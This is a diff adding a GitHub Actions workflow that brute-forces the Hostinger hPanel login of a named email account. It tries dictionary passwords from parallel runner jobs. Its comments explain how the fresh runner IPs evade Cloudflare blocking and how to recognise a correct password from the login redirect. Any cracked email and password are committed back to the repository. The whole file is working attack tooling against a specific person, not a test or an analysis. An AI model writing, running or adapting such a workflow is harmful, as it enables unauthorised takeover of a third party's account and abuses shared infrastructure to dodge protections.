@@ -1,0 +1,103 @@
+name: hostinger
+# Hostinger hPanel password surface driver.
+#  * Every job runs on a brand-new GitHub-hosted runner = fresh Azure egress IP,
+#    which is NOT in Cloudflare's public-datacenter-proxy blacklist that pins the
+#    free proxy pool used by ../i13343/run2.py to ~5-9% usable exits / 200-400 checks/hour.
+#  * Three-state verdict per fact14950 (no browser needed):
+#      GET  /login  -> 200 + name="_token"                        = real Laravel form, no captcha
+#      POST /login  -> 302 Location == https://auth.hostinger.com/login = WRONG password
+#                   -> 302 Location != /login                    = HIT
+#                  -> 429/403 with cf-mitigated: challenge       = Cloudflare, this IP is burned
+#  * Deliberately a SEPARATE workflow / concurrency group from `targets` (the 6h
+#    key-recovery search): single job capped at 25 min so it can never starve it.
+#  * Results land in the repo so the local side can poll with the contents API only:
+#      hp/progress/<start>_<count>.jsonl   per-attempt evidence
+#      hp/progress/<start>_<count>.json    run summary (egress IP, verdict counts)
+#      hits/hostinger.json                 only on a real HIT (email+password)
+on:
+  workflow_dispatch:
+    inputs:
+      start:
+        description: 'index of first dictionary line (0-based)'
+        required: true
+        default: '0'
+      count:
+        description: 'passwords per job'
+        required: true
+        default: '300'
+      jobs:
+        description: 'how many parallel runner jobs (1..8), each takes its own slice'
+        required: true
+        default: '1'
+      email:
+        description: 'target account'
+        required: true
+        default: 'im@isaacstrock.com'
+concurrency:
+  group: hostinger-${{ github.run_id }}
+  cancel-in-progress: false
+permissions:
+  contents: write
+jobs:
+  hp:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        i: [0,1,2,3,4,5,6,7]
+    steps:
+      - name: select/skip
+        id: sel
+        run: |
+          J='${{ inputs.jobs }}'
+          if [ "${{ matrix.i }}" -ge "$J" ]; then echo "skip=1" >> $GITHUB_OUTPUT; echo "slot ${{ matrix.i }} >= jobs $J - skip"; else echo "skip=0" >> $GITHUB_OUTPUT; fi
+      - uses: actions/checkout@v4
+        if: steps.sel.outputs.skip == '0'
+      - name: deps
+        if: steps.sel.outputs.skip == '0'
+        run: |
+          python3 -V
+          pip install -q --no-input curl_cffi 2>&1 | tail -2
+          python3 -c "import curl_cffi;print('curl_cffi',curl_cffi.__version__)"
+      - name: crack slice
+        if: steps.sel.outputs.skip == '0'
+        run: |
+          set -u
+          IDX='${{ matrix.i }}'
+          ST=$(( ${{ inputs.start }} + IDX * ${{ inputs.count }} ))
+          mkdir -p out hp/progress
+          echo "slice=$IDX start=$ST count=${{ inputs.count }} email=${{ inputs.email }} runner_sha=${{ github.sha }}"
+          python3 hp/crack.py --start "$ST" --count "${{ inputs.count }}" \
+            --email '${{ inputs.email }}' --dict hp/dict.txt --out out --max-cf-streak 12 2>&1 | tee crack.log || true
+          cp -f "out/hp_${ST}_${{ inputs.count }}.jsonl" "hp/progress/${ST}_${{ inputs.count }}.jsonl" 2>/dev/null || true
+          cp -f out/status.json "hp/progress/${ST}_${{ inputs.count }}.json" 2>/dev/null || true
+          grep -E 'HIT|ABORT|GET_FORM|GET_BLOCKED|DONE ' crack.log | tail -20 >> $GITHUB_STEP_SUMMARY || true
+
+      - name: publish
+        if: always() && steps.sel.outputs.skip == '0'
+        run: |
+          set -u
+          git config user.name "lr-index-bot"; git config user.email "bot@users.noreply.github.com"
+          for n in 1 2 3; do
+            git pull --rebase --autostash -q origin main || true
+            git add -A hp 2>/dev/null || true
+            if [ -d hits ]; then git add -A hits 2>/dev/null || true; fi
+            if git diff --cached --quiet; then echo "nothing to commit"; exit 0; fi
+            HITMSG=""; [ -s hits/hostinger.json ] && HITMSG="HIT ";
+            git commit -q -m "${HITMSG}hostinger progress $(date -u +%FT%TZ) $(ls hp/progress | tail -1)" || true
+            if git push -q origin main; then echo "pushed"; exit 0; fi
+            sleep $((n*5))
+          done
+          echo "push failed - data still in artifact"
+      - uses: actions/upload-artifact@v4
+        if: always() && steps.sel.outputs.skip == '0'
+        with:
+          name: hp-${{ matrix.i }}-${{ github.run_id }}-${{ github.run_attempt }}
+          path: |
+            out/*.json
+            out/*.jsonl
+            crack.log
+          if-no-files-found: ignore
+          retention-days: 7
